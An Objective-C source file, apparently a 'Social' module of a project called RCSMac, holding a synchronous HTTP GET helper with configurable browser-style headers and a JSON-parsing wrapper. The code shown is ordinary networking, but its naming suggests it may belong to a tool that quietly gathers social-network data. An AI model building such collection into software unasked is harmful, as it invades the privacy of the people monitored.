//
//  __m_Social.m
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//

#import "__m_Social.h"
#import "SBJson.h"

@implementation __m_Social

- (NSData *)sendHttpRequest: (NSString *)httpURL
{
    NSData *httpBuffer = nil;
    NSError *error = nil;
    NSURLResponse *urlResponse;
    NSMutableURLRequest *urlRequest;
    
    urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:httpURL]];
    [urlRequest setValue: SOCIAL_HTTP_USER_AGENT forHTTPHeaderField: @"User-Agent"];
    [urlRequest setValue: SOCIAL_HTTP_ACCEPT forHTTPHeaderField: @"Accept"];
    [urlRequest setValue: SOCIAL_HTTP_ACCEPT_ENCODING forHTTPHeaderField: @"Accept-Encoding"];
    
    httpBuffer =
        [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&urlResponse error:&error];
    if (error)
    {
        NSLog(@"sendHttpRequest: ERROR: %@", [error localizedDescription]);
        return nil;
    }
    
    return httpBuffer;
}

- (NSDictionary *)getParsedHttpResponse: (NSString *)httpURL offset:(int)jsonOffset
{
    NSData *httpBuffer = [self sendHttpRequest:httpURL];
    
    if (httpBuffer == nil || [httpBuffer length] <= jsonOffset)
        return nil;
    
    SBJsonParser *jsonParser = [SBJsonParser new];
    NSDictionary *jsonResponse =
        [jsonParser objectWithData: [httpBuffer subdataWithRange:NSMakeRange(jsonOffset, [httpBuffer length]-jsonOffset)]];
    if (jsonParser.error)
    {
        NSLog(@"[!!] JSON parsing error @ getParsedHttpResponse %@", jsonParser.error);
        return nil;
    }
    
    return jsonResponse;
}

@end
